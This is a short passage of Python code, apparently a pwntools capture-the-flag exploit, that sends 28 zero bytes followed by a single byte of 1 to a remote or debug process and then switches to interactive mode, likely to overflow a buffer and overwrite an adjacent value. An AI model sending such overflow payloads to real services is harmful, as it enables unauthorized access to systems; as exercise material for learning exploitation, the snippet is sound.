debug") as remote:
    remote.sendline(bytes([0 for _ in range(28)] + [1]))
    remote.interactive()